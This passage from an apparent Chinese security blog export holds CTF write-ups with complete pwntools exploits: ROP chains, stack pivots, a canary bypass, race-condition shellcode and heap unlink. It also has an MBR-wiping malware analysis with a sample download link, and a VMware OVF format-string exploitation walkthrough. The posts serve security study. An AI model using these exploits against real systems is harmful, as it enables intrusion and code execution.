bl.text:08048699 retn 最终代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455# -*- coding: utf-8 -*-from pwn import *p = process('./fluff32')p.recvuntil(\"&gt; \")# ROPgadget --binary ./fluff32 --depth 20 # 0x08048692 : pop edi ; mov dword ptr [ecx], edx ; pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; ret# 0x08048689 : xchg edx, ecx ; pop ebp ; mov edx, 0xdefaced0 ; ret# 0x0804867b : xor edx, ebx ; pop ebp ; mov edi, 0xdeadbabe ; ret# 0x08048671 : xor edx, edx ; pop esi ; mov ebp, 0xcafebabe ; ret# 0x080483e1 : pop ebx ; retmov_ecx_edx = 0x08048692xchg_edx_ecx = 0x08048689xor_edx_ebx = 0x0804867bxor_edx_edx = 0x08048671pop_ebx_ret = 0x080483e1call_system = 0x08048430bss_addr = 0x0804A040sh = \"sh\\x00\\x00\"notuse = \"a\" * 4# raw_input()# mov bss_addr to ecxpayload = \"a\" * 44 payload += p32(pop_ebx_ret)payload += p32(bss_addr)payload += p32(xor_edx_edx)payload += notusepayload += p32(xor_edx_ebx)payload += notusepayload += p32(xchg_edx_ecx)payload += notuse# mov sh to edx payload += p32(pop_ebx_ret)payload += shpayload += p32(xor_edx_edx)payload += notusepayload += p32(xor_edx_ebx)payload += notuse# mov sh to bss_addr (mov [ecx], edx)payload += p32(mov_ecx_edx)payload += notuse * 2payload += p32(0)# call systempayload += p32(call_system)payload += notuse payload += p32(bss_addr)p.sendline(payload)p.interactive() pivot一上来我就看这了 12345678910111213.text:0000000000400B00 public usefulGadgets.text:0000000000400B00 usefulGadgets:.text:0000000000400B00 pop rax.text:0000000000400B01 retn.text:0000000000400B02 ; ---------------------------------------------------------------------------.text:0000000000400B02 xchg rax, rsp.text:0000000000400B04 retn.text:0000000000400B05 ; ---------------------------------------------------------------------------.text:0000000000400B05 mov rax, [rax].text:0000000000400B08 retn.text:0000000000400B09 ; ---------------------------------------------------------------------------.text:0000000000400B09 add rax, rbp.text:0000000000400B0C retn 这个使用了so文件，ret2win在这个so文件里面实现，但是这个so是开启了PIE的 123456789.text:0000000000000ABE public ret2win.text:0000000000000ABE ret2win:.text:0000000000000ABE push rbp.text:0000000000000ABF mov rbp, rsp.text:0000000000000AC2 lea rdi, aBinCatFlag_txt ; \"/bin/cat flag.txt\".text:0000000000000AC9 call _system.text:0000000000000ACE mov edi, 0.text:0000000000000AD3 call _exit.text:0000000000000AD3 _text ends 查看pwnme函数，首先给了256大小的给你存放pivot，之后再溢出 1234567891011121314char *__fastcall pwnme(char *a1)&#123; char s; // [sp+10h] [bp-20h]@1 memset(&amp;s, 0, 0x20uLL); puts(\"Call ret2win() from libpivot.so\"); printf(\"The Old Gods kindly bestow upon you a place to pivot: %p\\n\", a1); puts(\"Send your second chain now and it will land there\"); printf(\"&gt; \"); fgets(a1, 256, stdin); puts(\"Now kindly send your stack smash\"); printf(\"&gt; \", 256LL); return fgets(&amp;s, 64, stdin);&#125; 所以我们需要先”泄露”地址咯，由于栈溢出的缓冲区大小比较少，完成泄露+执行完全不够用，所以要跳到a1去ROP，这技术叫stack pivot，栈翻转，就是让esp指向别处，在那rop 信息泄露的话，这里只有foothold_function是so里面的，而且存在got表，泄露完计算偏移就好 1.got.plt:0000000000602048 off_602048 dq offset foothold_function 由于这个函数没调用，需要调用一次，got表才会存在真正的地址 最终exp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051# -*- coding: utf-8 -*-from pwn import *p = process(\"./pivot\")elf = ELF(\"./pivot\")plt_foothold_function = elf.plt[\"foothold_function\"]got_foothold_function = elf.got[\"foothold_function\"]# 0xABE - 0x970 = 334ret2win_offset = 334# ROPgadget --binary ./pivot --depth 20# 0x0000000000400b00 : pop rax ; ret# 0x0000000000400b02 : xchg rax, rsp ; ret# 0x0000000000400b05 : mov rax, qword ptr [rax] ; ret# 0x0000000000400b09 : add rax, rbp ; ret# 0x0000000000400900 : pop rbp ; ret# 0x000000000040098e : call raxpop_rax_ret = 0x0000000000400b00xchg_rax_rsp = 0x0000000000400b02mov_rax_rax = 0x0000000000400b05add_rax_rbp_ret = 0x0000000000400b09pop_rbp_ret = 0x0000000000400900call_rax = 0x000000000040098ep.recvuntil(\"Call ret2win() from libpivot.so\\n\")p.recvuntil(\"The Old Gods kindly bestow upon you a place to pivot: \")heap_addr = int(p.recvuntil(\"\\n\").replace(\"\\n\", \"\"), 16)print \"heap_addr: \" + hex(heap_addr)p.recvuntil(\"&gt; \")rop_gadget = p64(plt_foothold_function)rop_gadget += p64(pop_rax_ret) rop_gadget += p64(got_foothold_function)rop_gadget += p64(mov_rax_rax)rop_gadget += p64(pop_rbp_ret)rop_gadget += p64(ret2win_offset)rop_gadget += p64(add_rax_rbp_ret)rop_gadget += p64(call_rax)p.sendline(rop_gadget)p.recvuntil(\"&gt; \")payload = \"a\" * 40 payload += p64(pop_rax_ret)payload += p64(heap_addr)payload += p64(xchg_rax_rsp)p.sendline(payload)p.recvuntil(\"into libpivot.so\")p.interactive() pivot32这个有如下gadgets 12345678910111213.text:080488C0 public usefulGadgets.text:080488C0 usefulGadgets:.text:080488C0 pop eax.text:080488C1 retn.text:080488C2 ; ---------------------------------------------------------------------------.text:080488C2 xchg eax, esp.text:080488C3 retn.text:080488C4 ; ---------------------------------------------------------------------------.text:080488C4 mov eax, [eax].text:080488C6 retn.text:080488C7 ; ---------------------------------------------------------------------------.text:080488C7 add eax, ebx.text:080488C9 retn 最终exp 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152# -*- coding: utf-8 -*-from pwn import *p = process('./pivot32')elf = ELF(\"./pivot32\")plt_foothold_function = elf.plt[\"foothold_function\"]got_foothold_function = elf.got[\"foothold_function\"]# 0x967 - 0x770 = 503ret2win_offset = 503# ROPgadget --binary ./pivot32 --depth 20# 0x080488c0 : pop eax ; ret# 0x080488c2 : xchg eax, esp ; ret# 0x080488c4 : mov eax, dword ptr [eax] ; ret# 0x080488c7 : add eax, ebx ; ret# 0x08048571 : pop ebx ; ret# 0x080486a3 : call eaxpop_eax_ret = 0x080488c0xchg_eax_esp = 0x080488c2mov_eax_eax = 0x080488c4add_eax_ebx_ret = 0x080488c7pop_ebx_ret = 0x08048571call_rax = 0x080486a3p.recvuntil(\"Call ret2win() from libpivot.so\\n\")p.recvuntil(\"The Old Gods kindly bestow upon you a place to pivot: \")heap_addr = int(p.recvuntil(\"\\n\").replace(\"\\n\", \"\"), 16)print \"heap_addr: \" + hex(heap_addr)p.recvuntil(\"&gt; \")rop_gadget = p32(plt_foothold_function)rop_gadget += p32(pop_eax_ret) rop_gadget += p32(got_foothold_function)rop_gadget += p32(mov_eax_eax)rop_gadget += p32(pop_ebx_ret)rop_gadget += p32(ret2win_offset)rop_gadget += p32(add_eax_ebx_ret)rop_gadget += p32(call_rax)p.sendline(rop_gadget)p.recvuntil(\"&gt; \")payload = \"a\" * 44payload += p32(pop_eax_ret)payload += p32(heap_addr)payload += p32(xchg_eax_esp)p.sendline(payload)p.recvuntil(\"into libpivot.so\")p.interactive() 其实栈翻转我们一般用leave;ret,上面64位有0x0a，所以用不了 上面的stack pivot可以用如下payload： 12345leave_ret = 0x080486a8p.recvuntil(\"&gt; \")payload = \"a\" * 40payload += p32(heap_addr - 4) # 因为后面的leave会pop ebp，所以这减4payload += p32(leave_ret)","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://www.giantbranch.cn/tags/pwn/"},{"name":"rop","slug":"rop","permalink":"https://www.giantbranch.cn/tags/rop/"}]},{"title":"3dsctf Malware 第三题开机\"锁机\"分析及恢复方法","slug":"3dsctf Malware 第三题开机-锁机-分析及恢复方法","date":"2017-12-17T00:00:00.000Z","updated":"2023-10-13T13:14:33.050Z","comments":true,"path":"2017/12/17/3dsctf Malware 第三题开机-锁机-分析及恢复方法/","link":"","permalink":"https://www.giantbranch.cn/2017/12/17/3dsctf Malware 第三题开机-锁机-分析及恢复方法/","excerpt":"","text":"[toc] 关于样本样本链接：https://810a5bdaafc6dd30b1d9979215935871.3dsctf.org//challs/malware/W32/08c0ab4e5b46889dc8b4c885077c59f5.zip 密码：infected! 建议不要在真实机运行，虽然下面有补救方法 分析这一题flag不是精华，感染mbr才是精华，现在打ctf，一不小心自己的电脑都要炸啊 感染代码如下： 首先对40300d处的字符串解密后，传入CreateFileA，之后往里面写入数据，之后提升权限，重启Windows 动态调试查看，解密后的字符串为\\.\\PhysicalDrive0，即硬盘0，那么就是写到MBR上去了 写入内容如下，后面具体分析 写入完成就重启了，那你就开不了机了，就叫你重装（恢复）吧，bitch 首先让大家看看重启后的效果，一开机就显示如下，并不能进入系统 我们进pe看看，winhex打开磁盘 可以看到引导代码被修改了，也看到了Restore XXX等字样（pe里面的winhex的字符有些错位，所以整个字符串没显示出来），而且分区表也没了 将磁盘前面的代码放到ida分析（16位汇编） ida也给到了一点注释，手动分析如下： 恢复办法u盘启动进入PE系统，打开diskgenius，里面的分区都不能识别，很好办 右键搜索一下即可 这样分区就出来了 再修复一下mbr winhex打开看看，已经恢复了 开机看看， 终于把我的虚拟机救回来了 参考资料https://www.cnblogs.com/CasonChan/p/4546658.htmlhttps://www.cnblogs.com/magic-cube/archive/2011/10/19/2217676.html","categories":[],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"https://www.giantbranch.cn/tags/Reverse/"},{"name":"malware","slug":"malware","permalink":"https://www.giantbranch.cn/tags/malware/"}]},{"title":"tmux简单使用","slug":"tmux简单使用","date":"2017-12-14T00:00:00.000Z","updated":"2023-10-13T13:14:33.130Z","comments":true,"path":"2017/12/14/tmux简单使用/","link":"","permalink":"https://www.giantbranch.cn/2017/12/14/tmux简单使用/","excerpt":"","text":"前言Tmux是一个优秀的终端复用软件 其实我一般拿来后台运行~ ubuntu安装很简单 1apt install tmux 使用新建一个终端直接输入tmux 或者起个有名字的，其中name你自己起 1tmux new -s name 回到正常的shellctrl + b是tmux的前缀 12ctrl + bd 列出后台的tmux终端1tmux ls 附加指定的tmux终端name可以是上面ls的结果 1tmux attach -t name 沿竖直方向切割新建一个终端Ctrl-b 之后按 % 沿水平方向分割Ctrl-b 之后按 “ 在 Tmux 的会话间切换Ctrl-b 之后按 s 关闭会话什么的kill-pane, kill-server, kill-session, kill-window 1234root@kali:~# tmux ls3: 1 windows (created Thu Dec 14 07:38:45 2017) [145x31]root@kali:~# tmux kill-session -t 3root@kali:~# tmux ls 只是关闭窗口 123456root@kali:~# tmux ls0: 1 windows (created Thu Dec 14 07:16:25 2017) [145x31] (attached)1: 1 windows (created Thu Dec 14 07:20:22 2017) [145x31]root@kali:~# tmux kill-window -t 1root@kali:~# tmux ls0: 1 windows (created Thu Dec 14 07:16:25 2017) [145x31] (attached) 参考https://www.cnblogs.com/lizhang4/p/7325086.htmlhttp://blog.jobbole.com/87584/","categories":[],"tags":[{"name":"tools","slug":"tools","permalink":"https://www.giantbranch.cn/tags/tools/"}]},{"title":"HBCTF whatiscanary","slug":"HBCTF whatiscanary","date":"2017-12-11T00:00:00.000Z","updated":"2023-10-13T13:14:33.054Z","comments":true,"path":"2017/12/11/HBCTF whatiscanary/","link":"","permalink":"https://www.giantbranch.cn/2017/12/11/HBCTF whatiscanary/","excerpt":"","text":"开始做之前不知道是简单题，因为没看wp，既然做了，就发出来吧 exp之前NX + CANARY CANARY很多时候直接覆盖argv即可 123456gdb-peda$ checksec CANARY : ENABLEDFORTIFY : disabledNX : ENABLEDPIE : disabledRELRO : Partial main函数，两个函数，一个读取flag文件到bss全局变量上，另一个是漏洞函数 1234567891011int __cdecl main()&#123; setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); setvbuf(stderr, 0, 2, 0); puts(\"hello, welcome to HBCTF!\"); openFlag(&amp;unk_804A0A0); vuln(); puts(\"exit\"); return 0;&#125; 漏洞函数，name存在溢出，不过有strlen检测，这个00截断，很容易绕过 12345678910111213141516int vuln()&#123; char name; // [sp+Ch] [bp-2Ch]@1 int v2; // [sp+2Ch] [bp-Ch]@1 v2 = *MK_FP(__GS__, 20); printf(\"input your name(length &lt; 10):\"); sub_804878A(&amp;name); if ( (signed int)strlen(&amp;name) &gt; 10 ) &#123; puts(\"error, will exit!\"); exit(0); &#125; printf(\"hello, '%s', wish you have a good result!\\n\", &amp;name); return *MK_FP(__GS__, 20) ^ v2;&#125; 开始本地测试先生成flag文件 1echo \"flag&#123;whatiscanary&#125;\" &gt; flag 我们运行起来看看，看看flag是不是在那 12gdb-peda$ x /s 0x804A0A00x804a0a0: \"flag&#123;whatiscana\"... 由于canary会输出argv中的程序名，那么这题覆盖argv为flag地址即可 偏移计算 1char name; // [sp+Ch] [bp-2Ch]@1 python手算 1234&gt;&gt;&gt; 0x2c44&gt;&gt;&gt; 44+448 其中4为ebp占用4字节 所以最终payload 12345678910111213141516# -*- coding: utf-8 -*-from pwn import *p = process(&apos;./whatiscanary&apos;)p.recvuntil(&quot;hello, welcome to HBCTF!\\n&quot;)p.recvuntil(&quot;input your name(length &lt; 10):&quot;)flag_addr = 0x804A0A0payload = &quot;aaaa\\x00&quot; payload += &quot;a&quot; * (48 - len(payload))payload += p32(flag_addr) * 100p.sendline(payload)p.interactive() 结果： 123456789101112131415161718192021222324252627282930313233343536root@kali:~/learn/pwn/HBCTFwhatiscanary# python exp.py [+] Starting local process './whatiscanary': pid 22162[*] Switching to interactive modehello, 'aaaa', wish you have a good result!*** stack smashing detected ***: flag&#123;whatiscanary&#125; terminated======= Backtrace: =========/lib/i386-linux-gnu/libc.so.6(+0x698aa)[0xf76398aa]/lib/i386-linux-gnu/libc.so.6(__fortify_fail+0x37)[0xf76cc9e7]/lib/i386-linux-gnu/libc.so.6(+0xfc9a8)[0xf76cc9a8]flag&#123;whatiscanary&#125;[0x8048851]flag&#123;whatiscanary&#125;[0x804a0a0]======= Memory map: ========08048000-08049000 r-xp 00000000 08:01 527067 /root/learn/pwn/HBCTFwhatiscanary/whatiscanary08049000-0804a000 r--p 00000000 08:01 527067 /root/learn/pwn/HBCTFwhatiscanary/whatiscanary0804a000-0804b000 rw-p 00001000 08:01 527067 /root/learn/pwn/HBCTFwhatiscanary/whatiscanary09839000-0985a000 rw-p 00000000 00:00 0 [heap]f75d0000-f7787000 r-xp 00000000 08:01 1316984 /lib/i386-linux-gnu/libc-2.25.sof7787000-f7788000 ---p 001b7000 08:01 1316984 /lib/i386-linux-gnu/libc-2.25.sof7788000-f778a000 r--p 001b7000 08:01 1316984 /lib/i386-linux-gnu/libc-2.25.sof778a000-f778b000 rw-p 001b9000 08:01 1316984 /lib/i386-linux-gnu/libc-2.25.sof778b000-f778e000 rw-p 00000000 00:00 0 f7793000-f77ae000 r-xp 00000000 08:01 1331725 /lib/i386-linux-gnu/libgcc_s.so.1f77ae000-f77af000 r--p 0001a000 08:01 1331725 /lib/i386-linux-gnu/libgcc_s.so.1f77af000-f77b0000 rw-p 0001b000 08:01 1331725 /lib/i386-linux-gnu/libgcc_s.so.1f77b0000-f77b4000 rw-p 00000000 00:00 0 f77b4000-f77b6000 r--p 00000000 00:00 0 [vvar]f77b6000-f77b8000 r-xp 00000000 00:00 0 [vdso]f77b8000-f77db000 r-xp 00000000 08:01 1315428 /lib/i386-linux-gnu/ld-2.25.sof77db000-f77dc000 r--p 00022000 08:01 1315428 /lib/i386-linux-gnu/ld-2.25.sof77dc000-f77dd000 rw-p 00023000 08:01 1315428 /lib/i386-linux-gnu/ld-2.25.soff7f3000-ff814000 rw-p 00000000 00:00 0 [stack][*] Process './whatiscanary' stopped with exit code -6 (SIGABRT) (pid 22162)[*] Got EOF while reading in interactive","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://www.giantbranch.cn/tags/pwn/"},{"name":"stack","slug":"stack","permalink":"https://www.giantbranch.cn/tags/stack/"}]},{"title":"WHCTF 2017 note_sys","slug":"WHCTF 2017 note_sys","date":"2017-12-11T00:00:00.000Z","updated":"2023-10-13T13:14:33.058Z","comments":true,"path":"2017/12/11/WHCTF 2017 note_sys/","link":"","permalink":"https://www.giantbranch.cn/2017/12/11/WHCTF 2017 note_sys/","excerpt":"","text":"首先看下保护措施，那我们就可以写shellcode了 123456gdb-peda$ checksec CANARY : ENABLEDFORTIFY : disabledNX : disabledPIE : ENABLEDRELRO : Partial 这个题目在新建note的时候和删除note的时候都会新建线程，这就有可能存在条件竞争了， 1234567891011121314151617181920212223242526272829303132__int64 newNote()&#123; __int64 result; // rax@9 __int64 v1; // rcx@9 char v2; // [sp+Bh] [bp-125h]@2 signed int v3; // [sp+Ch] [bp-124h]@1 pthread_t newthread; // [sp+10h] [bp-120h]@9 char *v5; // [sp+18h] [bp-118h]@1 char s; // [sp+20h] [bp-110h]@1 __int64 v7; // [sp+128h] [bp-8h]@1 v7 = *MK_FP(__FS__, 40LL); v3 = 250; v5 = &amp;s; memset(&amp;s, 0, 0x100uLL); puts(\"input your note, no more than 250 characters\"); while ( v3 ) &#123; v2 = getchar(); if ( v2 == '\\n' || !v2 || v2 == 0x90u || !v2 ) &#123; v5 = 0LL; break; &#125; *v5++ = v2; --v3; &#125; pthread_create(&amp;newthread, 0LL, (void *(*)(void *))start_routine, &amp;s); result = 0LL; v1 = *MK_FP(__FS__, 40LL) ^ v7; return result;&#125; 当然delete的时候也会创建线程 1234567891011121314__int64 delete()&#123; __int64 result; // rax@1 __int64 v1; // rdx@1 pthread_t newthread; // [sp+0h] [bp-10h]@1 __int64 v3; // [sp+8h] [bp-8h]@1 v3 = *MK_FP(__FS__, 40LL); puts(\"the last one will be deleted!\"); pthread_create(&amp;newthread, 0LL, (void *(*)(void *))deleteThread, 0LL); result = 0LL; v1 = *MK_FP(__FS__, 40LL) ^ v3; return result;&#125; 删除的时候会睡眠两秒，usleep的单位是微秒（microseconds：即百万分之一秒） 1234567891011121314151617181920212223242526272829void *__fastcall deleteThread(void *a1)&#123; void *result; // rax@2 __int64 v2; // rdx@4 int v3; // [sp+1Ch] [bp-14h]@1 void **v4; // [sp+20h] [bp-10h]@1 __int64 v5; // [sp+28h] [bp-8h]@1 v5 = *MK_FP(__FS__, 40LL); v4 = (void **)head; head = (char *)head - 8; v3 = num - 1; usleep(2000000u); // 休眠两秒 if ( num &lt;= 0 ) &#123; puts(\"too less notes!!\"); head = (char *)head + 8; result = 0LL; &#125; else &#123; free(*v4); num = v3; puts(\"delete successfully!\"); result = 0LL; &#125; v2 = *MK_FP(__FS__, 40LL) ^ v5; return result;&#125; 可以看到delete的sleep之前会不断将head指针减8，那我们可以让head指针减到指向free 这时候我们再malloc，就可以控制got表的地址，从而执行我们设定好的shellcode 首先head指针初始值为c0结尾 有malloc的时候head+8，所以我们将c0减到0x10，0x18执行free 所以减22次 最终 payload 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152from pwn import *context.log_level = 'debug' context.arch = 'amd64'p = process(\"./8d3f5092-148a-47ef-b9f3-f8b9b02a9137.note_sys\")# p = remote(\"127.0.0.1\", 10000)def newNote(content): p.recvuntil(\"choice:\\n\") p.sendline(\"0\") p.recvuntil(\"no more than 250 characters\\n\") p.sendline(content) p.recvline()def deleteNote(): p.recvuntil(\"choice:\\n\") p.sendline(\"2\") p.recvline() # 0: 6a 68 push 0x68 # 2: 48 b8 2f 62 69 6e 2f movabs rax,0x732f2f2f6e69622f # 9: 2f 2f 73 # c: 50 push rax # d: 48 89 e7 mov rdi,rsp # 10: 68 72 69 01 01 push 0x1016972 # 15: 81 34 24 01 01 01 01 xor DWORD PTR [rsp],0x1010101 # 1c: 31 f6 xor esi,esi # 1e: 56 push rsi # 1f: 6a 08 push 0x8 # 21: 5e pop rsi # 22: 48 01 e6 add rsi,rsp # 25: 56 push rsi # 26: 48 89 e6 mov rsi,rsp # 29: 31 d2 xor edx,edx # 2b: 6a 3b push 0x3b # 2d: 58 pop rax # 2e: 0f 05 syscall# if we sub 22,after malloc head will point to freefor x in xrange(0,22): deleteNote()# raw_input()payload = asm(shellcraft.sh())# print disasm(payload)# print payload.encode(\"hex\")newNote(payload)# raw_input()p.interactive()","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://www.giantbranch.cn/tags/pwn/"},{"name":"ctf","slug":"ctf","permalink":"https://www.giantbranch.cn/tags/ctf/"},{"name":"条件竞争","slug":"条件竞争","permalink":"https://www.giantbranch.cn/tags/条件竞争/"}]},{"title":"SECCON CTF 2017 Powerful_Shell","slug":"SECCON CTF 2017 Powerful_Shell","date":"2017-12-10T00:00:00.000Z","updated":"2023-10-13T13:14:33.058Z","comments":true,"path":"2017/12/10/SECCON CTF 2017 Powerful_Shell/","link":"","permalink":"https://www.giantbranch.cn/2017/12/10/SECCON CTF 2017 Powerful_Shell/","excerpt":"","text":"打开一开始一堆变量赋值，而且很长 我们拖到最后，有个create执行脚本的东西，而且还是前面的变量 那我们用Write-Host输出这个变量 得到的是另一串powershell脚本 扣下来，其中下面这部分只是验证Host，我们并不需要，直接删掉 运行一下是弹钢琴的操作 那我们添加代码，输出被处理后的值 就图片上的字母，自己试就行 最终得出对应如下 h 440j 493k 523f 349 按着secret的顺序输即可（输入顺序：hhjhhjhjkjhjhf） 又出来一串，一看就是十进制ascii 简单还原一下即可 结果又来一串 后来将\\n去掉，发现还是powershell，可以执行，要我们输入密码 后来将这个代码以;分割，输出前面的东西 发现这几个东西代表0-9 后来发现后面用了管道符，iex将字符串当powershell执行，你输出最后的那个${;}就知道 那我将管道符及后面的删除，输出如下 我们将那些数字扣下来，用sublime批量编辑，很快搞掂，写一下脚本就好了 其实还有更方便的，再将后面的管道符和iex删掉，再执行就好了","categories":[],"tags":[]},{"title":"HITCON CTF 2014 stkof","slug":"HITCON CTF 2014 stkof","date":"2017-12-04T00:00:00.000Z","updated":"2023-10-13T13:14:33.054Z","comments":true,"path":"2017/12/04/HITCON CTF 2014 stkof/","link":"","permalink":"https://www.giantbranch.cn/2017/12/04/HITCON CTF 2014 stkof/","excerpt":"","text":"准备工作ida打开，有反调试，nop掉，或者将时间改成很长 安全保护措施，可以写got表 寻找漏洞，free会将判断变量置0，不存在double free 那么同样也不存在uaf漏洞 edit的时候，size没有限制，可堆溢出 这种没有输出什么的程序，代码可以写得相当潇洒 unlink乍一看，没有输出函数啊，怎么泄露呢 后来想了想，没有输出函数，创造条件也要构造啊 可以改写strlen为puts，printf什么的 那么就可以将2的指针改了 跟着我们就可以通过操作2来覆盖1，利用1去写，再去读什么的 这里我写strlen的got表为plt_printf，这样就相当于构造了格式化字符串漏洞,不过有任意地址读写，就不用这个了，不过我看到有人用这个进行泄露的 之后通过下面的leak函数泄露即可 使用pwntools的DynELF泄露system地址 最后将atoi的got表改了 最终结果 完整exp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101# -*- coding: utf-8 -*-# http://blog.csdn.net/fuchuangbob/article/details/51649353# http://acez.re/ctf-writeup-hitcon-ctf-2014-stkof-or-modern-heap-overflow/from pwn import *# context.log_level = 'debug' p = process(\"./a679df07a8f3a8d590febad45336d031-stkof\")elf = ELF(\"./a679df07a8f3a8d590febad45336d031-stkof\")# libc = ELF(\"libc.so.6\")# print proc.pidof(p)[0]plt_printf = elf.plt[\"printf\"]got_strlen = elf.got[\"strlen\"]got_atoi = elf.got[\"atoi\"]# raw_input()def add(size): p.sendline(\"1\") p.sendline(str(size)) index = p.recvuntil(\"\\n\") p.recvuntil(\"OK\\n\") return indexdef edit(index, content): p.sendline(\"2\") p.sendline(str(index)) p.sendline(str(len(content))) p.sendline(content) p.recvuntil(\"OK\\n\")def free(index): p.sendline(\"3\") p.sendline(str(index)) p.recvuntil(\"OK\\n\")def output(index): p.sendline(\"4\") p.sendline(str(index)) def leak(address): payload = \"\\x00\"*0x10 + p64(address) edit(2, payload) output(1) data = p.recvuntil(\"OK\") if \"FAIL\" in data: data = data.replace(\"FAIL\\n\", \"\") data = data.split('\\x0aOK')[0] if \"...\" in data: data = data.replace(\"...\", \"\") elif \"//TODO\" in data: data = data.replace(\"//TODO\", \"\") print \"%#x =&gt; %s\" % (address, (data or '').encode('hex')) if data == \"\": return \"\\x00\" else: return data# ---------info leak---------print \"index: \" + add(0x80) # not use , not in a same memoryprint \"index: \" + add(0x80)print \"index: \" + add(0x80)print \"index: \" + add(0x80)# fd + 0x18 -&gt; P ?# bk + 0x10 -&gt; P?# FD = P-&gt;fd; \\# BK = P-&gt;bk; # FD-&gt;bk = BK; # BK-&gt;fd = FD;# at last BK-&gt;fd = FD; just store-&gt;fd = store + 0x10 = store-0x8store = 0x602140fakechunk = p64(0) + p64(0x81) + p64(store-0x8) + p64(store) + \"A\" * 0x60 + p64(0x80) + p64(0x90) + \"A\" * 0x80edit(2, fakechunk)free(3)# overwrite got_strlen with got_printfpayload = \"\\x00\" * 0x10 + p64(got_strlen)edit(2, payload)edit(1, p64(plt_printf))print \"plt_printf : \" + hex(plt_printf)print \"got_strlen : \" + hex(got_strlen)# leak systemd = DynELF(leak, elf=ELF(\"./a679df07a8f3a8d590febad45336d031-stkof\"))system_addr = int(d.lookup('system', 'libc'))print \"system_addr = \" + hex(system_addr)# raw_input()# write payload = \"\\x00\" * 0x10 + p64(got_atoi) edit(2, payload)edit(1, p64(system_addr))p.sendline(\"/bin/sh\\x00\")p.recvuntil(\"FAIL\\n\")p.interactive() 另外的overwrite目标有人将free改成puts，printf，其实也是可以的，最后写system的时候也可以将free改回system http://blog.csdn.net/fuchuangbob/article/details/51649353","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://www.giantbranch.cn/tags/pwn/"},{"name":"ctf","slug":"ctf","permalink":"https://www.giantbranch.cn/tags/ctf/"}]},{"title":"CVE-2012-3569-VMWare OVF Tools 格式化字符串漏洞","slug":"CVE-2012-3569-VMWare OVF Tools 格式化字符串漏洞","date":"2017-11-23T00:00:00.000Z","updated":"2023-10-13T13:14:33.050Z","comments":true,"path":"2017/11/23/CVE-2012-3569-VMWare OVF Tools 格式化字符串漏洞/","link":"","permalink":"https://www.giantbranch.cn/2017/11/23/CVE-2012-3569-VMWare OVF Tools 格式化字符串漏洞/","excerpt":"","text":"简介来源：漏洞战争 VMWare用得多，VMWare OVF Tools可能就很少用了，但是我们导入ovf文件时就要使用它 环境 Window7 虚拟机odwindbg 注：VMware OVF Tool利用附件的安装包安装就好 基于输出消息的漏洞定位方法先看poc了解一下 命令行打开poc 我们在最后留意到一个函数——capacityAllocationUnits，那个函数很有可能就是存在格式化字符串漏洞的函数了 这个直接用吾爱od带参数加载，会发现断不下来，那这个可以设置默认调试器，之后按上面图片的调试程序按纽即可 但用普通的可以，有可能只是调试选项设置的问题 下面是windbg 可以看到栈都是被00填充了，我们无法通过栈查找信息，或者说esp被修改了（当然只是猜测） 在当前exe的入口点搜索字符串——Invalid value，可以找到两处，但另外一处不符合，因为没有attribute（来到这我就跟着自己的思路调试了） 在上面的字符串双击跟过去发现，只是初始化字符串，那我就执行到返回，一步步f8，跟了挺久的，这个需要耐心 之后发现下面这个函数执行完就输出格式化串了 我们继续跟进，就是下面这个call edx 继续，最终在下面的basic_ostream调用输出了格式化字符串 我开始懵逼，没发现basic_ostream可以输出格式化字符串，以为这就只是一个cout， 以为我自己的调试方法不对，结果查看作者的，原来跟作者的惊人的一致 所以最终的结果是 还有一个小问题还有一个问题就是问什么产生异常呢， 可以看到异常指令retn之前， esp和ebp的差值是很大的，而所以导致esp最后急剧地减小，指向一个没用过的栈，当然上面都是00，所以就出现了这个情况 那这个ebp被修改了吗？确实是被修改了 看下poc，最后有个%hn，就是至修改低两位 我们也可以计算一下最后写入的值是多少？为0x32a 所以这里跟上面的ebp的0x00120345的低4位0x345非常接近了，（由于函数调用ebp的值有些许改变） 不信的话可以看看格式化时候的栈 可以看到输出的最后一个数是00000004，那么后一个参数就是要写入的地址所以而这个地址正好的ebp，因为下面就是返回地址啊 漏洞利用由于作者这个exp是适用于xp的，所以我的windows 7我看手动该改改能不能奏效 可以看到exp还是修改ebp ebp修改为12fc3c 之后再出一层函数，esp就被修改为12fc3c了 ebp又变为12ff18 最后出来发现ebp指向我们的可控字符串 最后导致esp可控 所以我们只需修改下面这个的对应位置为jmp esp的地址，下面再填充字母版shellcode就行了 比如我修改如下： 最后即可跳到栈上执行shellcode了 在源码中就是修改这个位置为jmp esp地址就好了 后面修改为shellcode，注意长度不要变换， 我们将XP8A改为AAAA看看是不是去到0x41414141那里吧 确实可以，那我们生成一下字母shellcode 12345678910111213141516171819~# msfvenom -l encodersFramework Encoders================== Name Rank Description ---- ---- ----------- cmd/echo good Echo Command Encoder cmd/generic_sh manual Generic Shell Variable Substitution Command Encoder cmd/ifs low Generic $&#123;IFS&#125; Substitution Command Encoder cmd/perl normal Perl Command Encoder cmd/powershell_base64 excellent Powershell Base64 Command Encoder cmd/printf_php_mq manual printf(1) via PHP magic_quotes Utility Command Encoder ......... x86/alpha_mixed low Alpha2 Alphanumeric Mixedcase Encoder x86/alpha_upper low Alpha2 Alphanumeric Uppercase Encoder x86/avoid_underscore_tolower manual Avoid underscore/tolower x86/avoid_utf8_tolower manual Avoid UTF8/tolower ...... 我们可以看到可以用大小写编码的，也可以用全大写的 但其实这个其实编码得不彻底 其实这个还是比较难搞的，直接修改返回地址为不可见字符 程序会抛出异常 我们来看看作者提供的shellcode，返回地址7852753d，都是可见字符，后面就是字母shellcode 